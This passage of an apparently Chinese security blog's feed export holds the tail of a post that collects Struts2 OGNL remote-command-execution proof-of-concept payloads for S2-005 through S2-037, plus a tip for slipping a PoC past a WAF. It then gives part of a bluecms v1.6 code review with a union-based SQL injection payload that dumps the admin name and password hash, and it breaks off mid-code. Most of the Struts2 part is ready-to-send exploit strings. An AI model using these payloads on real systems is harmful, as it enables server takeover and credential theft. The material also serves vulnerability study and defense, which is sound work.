title="获取tomcat执行路径"></a>获取tomcat执行路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><h4 id="获取web根目录"><a href="#获取web根目录" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-005"><a href="#Struts2-S2-005" class="headerlink" title="Struts2 S2-005"></a>Struts2 S2-005</h2><pre><code>影响版本: 2.0.0 - 2.1.8.1漏洞详情: http://struts.apache.org/docs/s2-005.html</code></pre><blockquote><p>struts2漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为ongl语句执行(可理解为java代码)。ongl表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式讲这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上</p></blockquote><p>上文引用<a href="http://www.cnblogs.com/LittleHann/p/4606891.html" target="_blank" rel="noopener">LittleHann</a>的描述</p><h3 id="构造PoC-1"><a href="#构造PoC-1" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根目录-1"><a href="#获取web根目录-1" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43req\75@org.apache.struts2.ServletActionContext@getRequest()&apos;)(d))&amp;(i2)((&apos;\43xman\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(i97)((&apos;\43xman.getWriter().println(\43req.getRealPath(%22\u005c%22))&apos;)(d))&amp;(i99)((&apos;\43xman.getWriter().close()&apos;)(d))</span><br></pre></td></tr></table></figure><h4 id="执行系统命令-1"><a href="#执行系统命令-1" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43mycmd\75\&apos;&quot;+cmd+&quot;\&apos;&apos;)(d))&amp;(h)((&apos;\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)&apos;)(d))&amp;(i)((&apos;\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())&apos;)(d))&amp;(j)((&apos;\43myres\75new\40byte[51020]&apos;)(d))&amp;(k)((&apos;\43mydat.readFully(\43myres)&apos;)(d))&amp;(l)((&apos;\43mystr\75new\40java.lang.String(\43myres)&apos;)(d))&amp;(m)((&apos;\43myout\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(n)((&apos;\43myout.getWriter().println(\43mystr)&apos;)(d))</span><br></pre></td></tr></table></figure><p>上面2个PoC摘自k8team，为了写PoC，有所改动，但是这里就不贴上来了：）</p><h2 id="Struts2-S2-009"><a href="#Struts2-S2-009" class="headerlink" title="Struts2 S2-009"></a>Struts2 S2-009</h2><pre><code>影响版本: 2.0.0 - 2.3.1.1漏洞详情: https://struts.apache.org/docs/s2-009.html</code></pre><p>漏洞利用点跟S2-003和S2-005类似，利用OGNL表达式(1)(2),会执行1的OGNL表达式，009构造了的方法为test=(some OGNL 表达式)(1)&amp;z[(test)(1)]=true。<br>z[(test)(1)]=true,对struts2来说是合法的参数，但是(test)(1)会执行上述说的方法，test的值被带入计算，造成命令执行。</p><h3 id="构造PoC-2"><a href="#构造PoC-2" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="弹计算器"><a href="#弹计算器" class="headerlink" title="弹计算器"></a>弹计算器</h4><p>ps:实验环境试了好几次都不能执行系统命令，路过的大佬求指教：）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person.name=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false), #_memberAccess[&quot;allowStaticMethodAccess&quot;]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec(&apos;open /Applications/Calculator.app&apos;))(meh)&amp;z[(person.name)(&apos;meh&apos;)]=true</span><br></pre></td></tr></table></figure><p>用的是<code>person/new-person.action</code>这个控制器</p><h4 id="获取web根目录-2"><a href="#获取web根目录-2" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person.name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%20new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%2C%23outstr%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23outstr.println%28%27webpath%3A%27%2b%23req.getRealPath%28%22%2f%22%29%29%2C%23outstr.close%28%29%29%28meh%29&amp;z%5B%28person.name%29%28%27meh%27%29%5D&quot;</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-012"><a href="#Struts2-S2-012" class="headerlink" title="Struts2 S2-012"></a>Struts2 S2-012</h2><pre><code>影响版本: 2.0.0 - 2.3.13漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-012</code></pre><p>Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量,struts在获取其值时会执行OGNL表达式，从而造成命令执行</p><h3 id="构造PoC-3"><a href="#构造PoC-3" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根路径"><a href="#获取web根路径" class="headerlink" title="获取web根路径"></a>获取web根路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%29%7D</span><br></pre></td></tr></table></figure><h4 id="执行系统命令-2"><a href="#执行系统命令-2" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%29%7D%0A%0A</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-013-S2-014"><a href="#Struts2-S2-013-S2-014" class="headerlink" title="Struts2 S2-013/S2-014"></a>Struts2 S2-013/S2-014</h2><pre><code>影响版本: 2.0.0 - 2.3.14.1漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-013,https://cwiki.apache.org/confluence/display/WW/S2-014</code></pre><p>标签<code>s:url</code>和<code>s:a</code>中提供include参数，其参数值可以为</p><ol><li>none - include no parameters in the URL (default)</li><li>get - include only GET parameters in the URL</li><li>all - include both GET and POST parameters in the URL</li></ol><p>如果参数值为get或all，在获取对应的参数值时执行了OGNL表达式</p><h3 id="构造PoC-4"><a href="#构造PoC-4" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根目录-3"><a href="#获取web根目录-3" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;webpath%3a&apos;%2b%23req.getRealPath(&quot;/&quot;)),%23out.close())&#125;</span><br></pre></td></tr></table></figure><h4 id="执行系统命令-3"><a href="#执行系统命令-3" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&apos;&quot;+cmd+&quot;&apos;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;dbapp%3a&apos;%2bnew java.lang.String(%23d)),%23out.close())&#125;</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-016"><a href="#Struts2-S2-016" class="headerlink" title="Struts2 S2-016"></a>Struts2 S2-016</h2><pre><code>影响版本: 2.0.0 - 2.3.15漏洞详情: https://struts.apache.org/docs/s2-016.html</code></pre><blockquote><p>DefaultActionMapper 类支持以 action:，redirect: 和 redirectAction: 作为访问前缀，前缀后面可以跟 OGNL 表达式，由于 Struts2 未对其进行过滤，导致任意 Action 可以使用这些前缀执行任意 OGNL 表达式，从而导致任意命令执行</p></blockquote><p>上文引用<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">rickgray</a>的描述。</p><h3 id="构造PoC-5"><a href="#构造PoC-5" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根目录-4"><a href="#获取web根目录-4" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:$&#123;#req=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletReq&apos;+&apos;uest&apos;),#resp=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletRes&apos;+&apos;ponse&apos;),#resp.setCharacterEncoding(&apos;UTF-8&apos;),#ot=#resp.getWriter (),#ot.print(&apos;web&apos;),#ot.print(&apos;path:&apos;),#ot.print(#req.getSession().getServletContext().getRealPath(&apos;/&apos;)),#ot.flush(),#ot.close()&#125;</span><br></pre></td></tr></table></figure><h4 id="执行系统命令-4"><a href="#执行系统命令-4" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect:$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;whoami&apos;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&apos;co&apos;+&apos;m.ope&apos;+&apos;nsymph&apos;+&apos;ony.x&apos;+&apos;wor&apos;+&apos;k2.disp&apos;+&apos;atch&apos;+&apos;er.HttpSe&apos;+&apos;rvletRe&apos;+&apos;sponse&apos;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;&apos;</span><br></pre></td></tr></table></figure><p>还有一种比较隐蔽的方法，将PoC放在文件上传的name处，过waf。</p><h2 id="Struts2-S2-019"><a href="#Struts2-S2-019" class="headerlink" title="Struts2 S2-019"></a>Struts2 S2-019</h2><pre><code>影响版本: 2.0.0 - 2.3.15.1漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-019</code></pre><p>该漏洞成因为开启了开发者模式，传入<code>debug=command&amp;expression=</code>导致执行OGNL表达式，从而造成命令执行漏洞。</p><h3 id="构造PoC-6"><a href="#构造PoC-6" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根路径-1"><a href="#获取web根路径-1" class="headerlink" title="获取web根路径"></a>获取web根路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29</span><br></pre></td></tr></table></figure><h4 id="执行系统命令-5"><a href="#执行系统命令-5" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-032"><a href="#Struts2-S2-032" class="headerlink" title="Struts2 S2-032"></a>Struts2 S2-032</h2><pre><code>影响版本: 2.3.20 - 2.3.28 (except 2.3.20.3 and 2.3.24.3)漏洞详情: https://struts.apache.org/docs/s2-032.html</code></pre><blockquote><p>在配置了 Struts2 DMI 为 True 的情况下，可以使用 method:<name> Action 前缀去调用声明为 public 的函数，DMI 的相关使用方法可参考官方介绍（Dynamic Method Invocation），这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会，代码详情可参考阿尔法实验室的报告 - 《Apache Struts2 s2-032技术分析及漏洞检测脚本》</name></p></blockquote><p>上文引用<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">rickgray</a>的描述。</p><h3 id="构造PoC-7"><a href="#构造PoC-7" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根目录-5"><a href="#获取web根目录-5" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath:</span><br></pre></td></tr></table></figure><h4 id="执行系统命令-6"><a href="#执行系统命令-6" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag:</span><br></pre></td></tr></table></figure><h2 id="Struts2-S2-037"><a href="#Struts2-S2-037" class="headerlink" title="Struts2 S2-037"></a>Struts2 S2-037</h2><pre><code>影响版本: 2.3.20 - 2.3.28.1漏洞详情: http://struts.apache.org/docs/s2-037.html</code></pre><blockquote><p>这个漏洞和之前S2-032/033是一个地方，都是在DefaultActionInvocation.java的invokeAction方法中没有对于methodName参数内容进行校验，便直接丢到了getValue方法里面，从而造成Ongl表达式的注入。</p></blockquote><p>上文引用<a href="http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438" target="_blank" rel="noopener">nsfocus</a>%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html)的描述</p><h3 id="构造PoC-8"><a href="#构造PoC-8" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根目录-6"><a href="#获取web根目录-6" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close):xx.toString.json?&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath:</span><br></pre></td></tr></table></figure><h4 id="执行系统命令-7"><a href="#执行系统命令-7" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()):xx.toString.json?&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag:</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Struts2命令执行算是一个比较经典的漏洞了，希望以后深入java的一些框架，可以从底层来分析：）</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Code Review】bluecms v1.6 Sql Injection 分析</title>
      <link href="/2017/01/11/old-bluecms-v1-6-Sql-Injection/"/>
      <url>/2017/01/11/old-bluecms-v1-6-Sql-Injection/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>很久没有代码审计了，拿一套简单的找找感觉。bluecms是一套比较老的门户网站cms，网上也有很多关于它的漏洞还未修补，所以下文的漏洞也不算是最新的，仅当是练练手。</p><a id="more"></a><h1 id="SQL注入分析"><a href="#SQL注入分析" class="headerlink" title="SQL注入分析"></a>SQL注入分析</h1><p>首先关注一下数据的输入</p><h2 id="全局数据转义"><a href="#全局数据转义" class="headerlink" title="全局数据转义"></a>全局数据转义</h2><p>在common.inc.php中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$_POST = deep_addslashes($_POST);</span><br><span class="line">$_GET = deep_addslashes($_GET);</span><br><span class="line">$_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">$_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再跟进一下deep_addslashes</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function deep_addslashes($str)</span><br><span class="line">&#123;</span><br><span class="line">if(is_array($str))</span><br><span class="line">&#123;</span><br><span class="line">foreach($str as $key=&gt;$val)</span><br><span class="line">&#123;</span><br><span class="line">$str[$key] = deep_addslashes($val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$str = addslashes($str);</span><br><span class="line">&#125;</span><br><span class="line">return $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现对数据的注入，进行了加斜杠转义的操作。那么接下来找注入思路主要有以下3点：</p><ol><li>找整数型注入</li><li>整套cms默认gb2312编码，容易造成宽字节注入</li><li>http头并不在转义的范围内，所以类似存入ip，reffer的位置也能发生注入</li></ol><h2 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h2><p>拿grep匹配了一下$_GET，找到一处不做其他过滤的整数型位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ad_js.php:$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;</span><br></pre></td></tr></table></figure><p>跟进ad_js.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;</span><br><span class="line">if(empty($ad_id))</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;Error!&apos;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id);</span><br></pre></td></tr></table></figure><p>getone函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function getone($sql, $type=MYSQL_ASSOC)&#123;</span><br><span class="line">    $query = $this-&gt;query($sql,$this-&gt;linkid);</span><br><span class="line">    $row = mysql_fetch_array($query, $type);</span><br><span class="line">    return $row;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里对ad_id没有做其他过滤处理，造成了整数型注入,由于后面会将ad_content打印在页面上，所以直接用union注入就可以获得数据，构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,concat(admin_name,0x23,pwd)%20from%20blue_admin%20limit%201</span><br></pre></td></tr></table></figure><p>结果可以在返回的界面中看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">document.write(&quot;admin#21232f297a57a5a743894a0e4a801fc3&quot;);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>ps:因为该cms错误回显具体sql语句，表前缀可以通过报错的方法把表前缀爆出来。</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>bluecms操作数据库的具体类定义在mysql.class.php,默认连接时的编码为gbk，我们可以知道当数据库连接时的编码为gbk等双字节编码时，容易发生宽字节注入。前面提到该套cms对数据输入进行了转义的操作，那么刚刚好条件都齐了，必然存在宽字节注入。grep看了一下，基本上的字符串都只是做了转义处理，所以字符串数据输入点都存在宽字节注入。大多数注入都是盲注，没找到具体可以会显数据的地方，这里就简单看一下登陆处</p><h3 id="后台登录处"><a href="#后台登录处" class="headerlink" title="后台登录处"></a>后台登录处</h3><p>其实前台user.php，也存在注入，只是盲注，这里就取简单的后台登录验证处<br>admin/login.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">elseif($act == &apos;do_login&apos;)&#123;</span><br><span class="line"> $admin_name = isset($_POST[&apos;admin_name&apos;]) ? trim($_POST[&apos;admin_name&apos;]) : &apos;&apos;;</span><br><span class="line"> $admin_pwd = isset($_POST[&apos;admin_pwd&apos;]) ? trim($_POST[&apos;admin_pwd&apos;]) : &apos;&apos;;</span><br><span class="line"> $remember = isset($_POST) ? intval($_POST[&apos;rememberme&apos;]) : 0;</span><br><span class="line"> if($admin_name == &apos;&apos;)&#123;</span><br><span class="line"> showmsg(&apos;xxx&apos;);</span><br><span class="line"> &#125;</span><br><span class="line"> if($admin_pwd == &apos;&apos;)&#123;</span><br><span class="line"> showmsg(&apos;xxx&apos;);</span><br><span class="line"> &#125;</span><br><span class="line"> if(check_admin($admin_name, $admin_pwd))&#123;</span><br><span class="line"> update_admin_info($admin_name);</span><br><span class="line"> if($remember == 1)&#123;</span><br><span class="line"> setcookie(&apos;Blue[admin_id]&apos;, $_SESSION[&apos;admin_id&apos;], time()+86400);</span><br><span class="line"> setcookie(&apos;Blue[admin_name]&apos;, $admin_name, time()+86400);</span><br><span class="line">setcookie(&apos;Blue[admin_pwd]&apos;, md5(md5($admin_pwd).$_CFG[&apos;cookie_hash&apos;]), time()+86400);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;else&#123;</span><br><span class="line"> showmsg(&apos;xxx&apos;);</span><br><span class="line"> &#125;</span><br><span class="line"> showmsg(&apos;xxx&apos;, &apos;index.php&apos;);</span><br><span class="line"> 